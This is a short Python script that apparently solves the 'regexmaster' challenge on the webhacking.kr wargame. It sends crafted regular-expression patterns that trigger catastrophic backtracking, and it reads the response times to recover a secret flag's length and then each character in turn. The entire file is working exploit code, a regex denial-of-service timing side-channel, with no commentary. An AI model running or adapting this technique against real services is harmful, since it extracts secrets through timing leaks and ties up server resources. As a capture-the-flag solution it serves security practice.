import time
import string
import requests
 
url = "http://regexmaster.webhacking.kr/?pattern="

def flag_len():
    times = {}
    for i in range(1,50):
        payload = "^(?=.{" + str(i) + "}$)(.*)*{"
        print(payload)
        start = time.time()
        res = requests.get(url=url+payload)
        end = time.time()
        times[i] = end - start
    length = max(times, key=lambda i: times[i])
    print("FLAG LENGTH : " + str(length))
    return length

def find_flag(length):
    times = {}
    flag = "FLAG{"
    for i in range(5,length):
        for j in string.printable:
            if j == '/':
                payload = "^(?=.{" + str(i) + "}" + '\/' + ".*$)(.*)*{"
                print(payload)
            elif j == '\\':
                payload = "^(?=.{" + str(i) + "}" + '\\\\' + ".*$)(.*)*{"
                print(payload)
            elif j == '.' or j == '|' or j == '?' or j == '&' or j == '\n' or j == '\t':
                continue
            else:
                payload = "^(?=.{" + str(i) + "}" + j + ".*$)(.*)*{"
                print(payload)
            start = time.time()
            res = requests.get(url=url+payload)
            end = time.time()
            times[j] = end - start
        flag_char = max(times, key=lambda j: times[j])
        flag += str(flag_char)
        print("FLAG CHAR : " + flag)
    print("FLAG : " + flag)


if __name__ == "__main__":
    length = flag_len()
    find_flag(length)

